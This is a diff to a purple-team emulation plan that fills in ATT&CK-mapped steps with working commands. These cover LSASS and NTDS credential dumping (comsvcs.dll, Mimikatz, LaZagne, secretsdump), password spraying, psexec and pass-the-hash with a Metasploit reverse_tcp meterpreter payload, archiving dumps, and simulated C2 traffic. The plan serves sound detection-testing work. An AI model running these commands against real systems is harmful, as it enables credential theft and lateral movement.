@@ -1,17 +1,20 @@
 # Context and Goal
 When I first created this emulation plan, I wanted something reprensentative of what most organizations are likely to face, hence having a top MITRE techniques.
+This more a simulation plan than real emulation of a threat as it is a combination of the most used techniques by various adversaries. Intel has been gathered through different public intel reports.
 My goal is to enable more organizations to be able to Purple Team. So cancel that internal web app that you wanted to pentest and give this emulation plan to the pentester. Make him/her sit with your Blue Team.
 
 In order to onboard as much organization as we can into the adversary emulation world, I tried to avoid using C2 as much as possible.
 For more mature organizations, you might therefore enrich this plan with a bit more C2 flavor to make it more realistic.
-However this is a very good start for any organization to test their defenses against typical TTPs. And it doesn't require a strong mature red team infra.
+However, this is a very good start for any organization to test their defenses against typical TTPs. And it doesn't require a strong mature red team infra.
 
 Now keep in mind that the goal is not to detect 100% of the tested techniques. Preventing or detecting one of this technique is already a win for the Blue Team. The idea of catching one of the many steps performed by an attacker along the killchain is still a valid concept.
 For some techniques, it will definitely makes sense to invest effort into hardening to prevent it or invest into detection engineering to detect it. For other you might only need to ensure that you can get the right telemetry. A trade-off is to be found. 
 
-# How to
-Use the spreadsheet and this repository's resource to lead the purple team exercise. Plan the exercise with your sysadmin/network team, why not invite them around the table to strenghten collaboration? The most realistic emulation should occur on a production environment. 
-By default the spreadsheet offers 2 lines to document security controls for each technique. If you have identified (pre or post execution) more than 2 security controls, just add a new line in between. 
+# How to tips
+- Use the spreadsheet and this repository's resource to lead the purple team exercise. Plan the exercise with your sysadmin/network team, why not invite them around the table to strenghten collaboration? 
+- By default the spreadsheet offers 2 lines to document security controls for each technique. If you have identified (pre or post execution) more than 2 security controls, just add a new line in between.
+- The most realistic simulation/emulation should occur on a production environment. 
+- For the endpoint tests, try first with all security enabled (AV, EDR, FW, etc.). If the technique is blocked, this is great! Document and retest with the security disabled to see what's your position on the telemetry for that technique. We all have that workstation where the AV/EDR is struggling to work properly, could you at least detect it if this one was targeted?
 
 To ease the reading, I've extracted each procedure's step below and added few comments.
 
@@ -131,13 +134,23 @@ reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Ru
 
 ### Step 18 - Privilege Escalation/Defense Evasion: T1055.001 Process Injection: Dynamic-link Library Injection & S0154 Cobalt Strike
 
-
+1. Download benin reflective DLL for injection testing at: https://github.com/stephenfewer/ReflectiveDLLInjection/blob/master/bin/reflective_dll.x64.dll
+2. Requires a meterpreter session
+3. In msfconsole run the following commands:
+```
+use post/windows/manage/reflective_dll_inject
+set PATH <PATH_TO_DOWNLOADED_DLL>
+set PID <TARGET_PID>
+set SESSION <SESSION_ID>
+run
+```
 
 ### Step 19 - Privilege Escalation/Defense Evasion: T1055.012 Process Injection: Process Hollowing
 
 
 
 ### Step 20 - Defense Evasion: T1218.010 System Binary Proxy Execution: Regsvr32
+
 Because regsvr32 is used to register or unregister an OLE object, the DLL needs and will executes by default an export function named DllRegisterServer.
 1. Download this harmless DLL from RedCanary github: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll
 2. Execute: ```regsvr32.exe /s .\Downloads\AllTheThingsx86.dll```
@@ -145,6 +158,7 @@ Because regsvr32 is used to register or unregister an OLE object, the DLL needs 
 This DLL was part of an open source project that no longer exists but the DLL is harmless and has been built to be loaded in various ways such as DllRegisterServer function. Upon execution the function DllRegisterServer will execute calc.exe. You should therefore see a calculator pops up on the screen. Alternatively you can remove the "/s" argument (silent) to get a confirmation (or error) message about the execution, though attackers usually use the "/s" argument to avoid tipping off potential user. 
 
 ### Step 21 - Defense Evasion: T1218.011 System Binary Proxy Execution: Rundll32
+
 Calling export function name with arguments
 ```rundll32 advpack.dll, RegisterOCX ""cmd.exe /c calc.exe""```
 
@@ -156,15 +170,32 @@ Calling export function by negative ordinal number with args
 
 ### Step 22 - Credential Access: T1003.001 OS Credential Dumping: LSASS Memory & S0002 Mimikatz & S0349 Lazagne
 
-
+1. Dump LSASS Memory using comsvcs.dll by running the following command in an elevated command prompt:
+1.1 ```rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\Users\purple\lsass-comsvcs.dmp full```
+2. Download Mimikatz here: https://github.com/gentilkiwi/mimikatz/releases/latest and run the following in an elevated command prompt:
+2.1 ```mimikatz.exe```
+2.2 ```privilege::debug```
+2.3 ```sekurlsa::logonpasswords```
+3. Download ""Invoke-Mimikatz"" as m.ps1 and run the following in an elevated Powershell prompt:
+3.1 ```Import-Module C:\Users\purple\m.ps1; Invoke-Mimikatz -ComputerName <COMPUTER_NAME>```
+4. Download LaZagne here: https://github.com/AlessandroZ/LaZagne/releases/latest and run the following in an elevated command prompt:
+4.1 ```lazagne.exe all -oN -output C:\Users\purple```
+5. Execute the same procedure as 4 but with a renamed binary 
+5.1 ```ls.exe all -oN -output C:\Users\purple```
 
 ### Step 23 - Credential Access: T1003.003 OS Credential Dumping: NTDS
 
+1. Dump NTDS with ntdsutil by running the following in a command prompt on DC:
+1.1 ```ntdsutil ""ac i ntds"" ""ifm"" ""create full dump_folder"" q q```
 
+2. Dump NTDS using secretsdump.py downloaded at: https://github.com/fortra/impacket/blob/master/examples/secretsdump.py
+2.1 ```python3 secretsdump.py -just-dc domain/user@DChostname```
+2.2 ```python3 secretsdump.py -just-dc domain/user@DC hostname -use-vss```
 
 ### Step 24 - Credential Access: T1110.003 Brute force: Password Spraying
 
-
+Download password spray script at https://github.com/dafthack/DomainPasswordSpray and run the following:
+```Import-Module .\domainpasswordspary.ps1; Invoke-DomainPasswordSpray -UserList .\users.txt -domain domain.local -PasswordList passwords.txt -OutFile creds.txt```
 
 ### Step 25 - Discovery: T1482 Domain Trust Discovery & T1018 Remote System Discovery & T1016 System Network Configuration Discovery & T1082 System Information Discovery
 
@@ -198,31 +229,66 @@ adfind -f objectcategory=computer > ad_computers.txt
 
 ### Step 27 - Lateral Movement: T1021.001 Remote Services: Remote Desktop Protocol
 
-
+Use mstsc.exe to login into a remote computer of your choice
 
 ### Step 28 - Lateral Movement: T1021.002 Remote Services: SMB/Windows Admin Shares
 
-
+Download psexec from official source:  https://learn.microsoft.com/en-us/sysinternals/downloads/psexec and run the following command:
+```psexec.exe  \\<IP ADDRESS> -u <DOMAIN>\Administrator -p ""<PASSWORD>"" -s -d -h -r mstdc -accepteula -nobanner C:\windows\system32\calc.exe```
 
 ### Step 29 - Lateral Movement: T1550.002 Use Alternate Authentication Material: Pass the Hash
 
+Metasploit - PSexec module
+1. Get a meterpreter session
+2. Run the following commands
+```
+use exploit/windows/smb/psexec
+set RHOSTS <TARGET_IP>
+set SMBDomain <TARGET_DOMAIN>
+set SMBUser <TARGET_USER
+set SMBPass <LMHASH>:<NTHASH>
+set SMBSHARE ADMIN$
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST <ATTACKING_IP>
+set LPORT <LISTENING_PORT
+exploit
+```
 
+PSExec
+1. Using the NTLM hash from previous Mimikatz test
+2. Run the following mimikatz command 
+```sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTHASH>```
+3. In the new cmd windows opened, run the following psexec command: ```psexec \\<IP> cmd.exe```
 
 ### Step 30 - Collection: T1560.001 Archive Collected Data: Archive via Utility & S0160 certutil
 
-
+Usage of certutil and 7z using the following command lines:
+1. ```certutil -encode inputFile outputFile```
+2. ```C:\Windows\system32\cmd.exe /C 7za.exe a -tzip -mx5 c:\programdata\lsass.zip c:\programdata\lsass.dmp```
 
 ### Step 31 - Command and Control: T1219 Remote Access Software
 
-AnyDesk
-Splashtop Remote/Streamer
-Atera RMM
-TeamViewer
+Those tools usually have a free version but it requires to sign up with an account. Sign up, download from the official website and sign-in to be able to remotely access.
+1. AnyDesk
+2. Splashtop Remote/Streamer
+3. Atera RMM
+4. TeamViewer
 
 ### Step 32 - Command and Control: T1071 Application Layer Protocol
 
-TBD, tools and malware families to simulate have to be selected
-https://github.com/alphasoc/flightsim
+1. Download flightsim from: https://github.com/alphasoc/flightsim/releases
+2. Follow installation procedure depending on package downloaded.
+3. Run the following commands to simulate C2 traffic:
+```flightsim run c2:trickbot```
+```flightsim run c2:bumblebee```
+```flightsim run ""c2:raccoon stealer""```
+```flightsim run ""c2:redline stealer""```
+```flightsim run ""c2:respberry robin""```
+```flightsim run ""c2:raccoon stealer""```
+```flightsim run ""c2:remcos rat""```
+
+Alternatively, run the following command to retrieve the list of all c2 families available for you to test:
+```flightsim get c2:families```
 
 ### Step 33 - Exfiltration: T1567 Exfiltration Over Web Service: Exfiltration to Cloud Storage & S1040 Rclone
 
